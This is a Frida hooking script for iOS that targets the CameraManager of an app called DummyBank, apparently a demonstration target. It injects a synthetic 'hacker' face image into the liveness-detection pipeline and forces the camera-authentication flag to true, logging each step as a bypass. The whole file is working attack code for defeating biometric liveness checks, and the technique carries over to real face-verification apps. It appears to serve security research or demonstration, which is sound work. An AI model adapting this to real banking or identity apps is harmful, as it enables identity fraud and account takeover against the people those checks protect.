/**
 * Sentinel Hook - Enterprise Camera Injector
 * Phase 3.0: Stealth AVCaptureSession Bypass
 * FIXED: Calls sentinelCameraBypass() on Swift CameraManager to update UI state.
 */

if (ObjC.available) {
    console.log("[🌟] SENTINEL SUBSYSTEM: Initiating Camera Flow Override (AVCaptureSession)");

    var targetClassName = "_TtC9DummyBank13CameraManager";

    try {
        var AppCameraManager = ObjC.classes[targetClassName];
        
        if (AppCameraManager) {
            console.log("[+] TARGET LOCKED: " + targetClassName + " mapped in memory.");

            // Hook simulateFrameTrigger to inject synthetic frames
            try {
                var lastLogTime = 0;
                Interceptor.attach(AppCameraManager["- simulateFrameTrigger"].implementation, {
                    onEnter: function(args) {
                        var now = Date.now();
                        if (now - lastLogTime > 2000) {
                            var inst = new ObjC.Object(args[0]);
                            console.log("[💥] SENTINEL SENSOR LINK: Intercepting raw video feed...");
                            console.log("    -> Action: Injecting synthetic frame payload into Liveness pipeline!");
                            
                            var hackerImagePath = "/Users/kadirarici/Desktop/Biometric Logic Bypass/Sentinel_Hook/.local/test-faces/hacker.jpg";
                            var nsPath = ObjC.classes.NSString.stringWithString_(hackerImagePath);
                            try { inst["- receiveHackerImage:"](nsPath); } catch(e) {}
                            
                            console.log("[✅] OVERRIDE: Synthesization complete. Virtual feed active.");
                            lastLogTime = now;
                        }
                    }
                });
            } catch(e) {}

            // KEY FIX: Call sentinelCameraBypass() to update Swift @Published state → UI shows COMPROMISED
            try {
                // Find any live instance of CameraManager using chooseClass
                var instances = ObjC.chooseSync(AppCameraManager);
                if (instances.length > 0) {
                    var inst = instances[0];
                    console.log("[💥] SENTINEL: Calling sentinelCameraBypass() on live instance...");
                    inst["- sentinelCameraBypass"]();
                    console.log("[✅] CAMERA GATE: isCameraAuthenticated → TRUE. UI notified.");
                } else {
                    // No live instance yet — hook the method so next time it's called we also fire bypass
                    Interceptor.attach(AppCameraManager["- sentinelCameraBypass"].implementation, {
                        onEnter: function() {
                            console.log("[💥] CAMERA BYPASS: sentinelCameraBypass hooked and triggered.");
                        }
                    });
                    // Force create by hooking startDummySessionForSimulator
                    Interceptor.attach(AppCameraManager["- startDummySessionForSimulator"].implementation, {
                        onEnter: function(args) {
                            var i = new ObjC.Object(args[0]);
                            i["- sentinelCameraBypass"]();
                            console.log("[✅] CAMERA GATE: Bypass injected at session start.");
                        }
                    });
                }
            } catch(e) {
                console.log("[-] Instance bypass failed: " + e.message);
            }

        } else {
            console.log("[-] WARNING: CameraManager class not found.");
        }
    } catch (err) {
        console.log("[-] FATAL: Camera hook failed - " + err.message);
    }
} else {
    console.log("[-] FATAL: ObjC Runtime unavailable.");
}
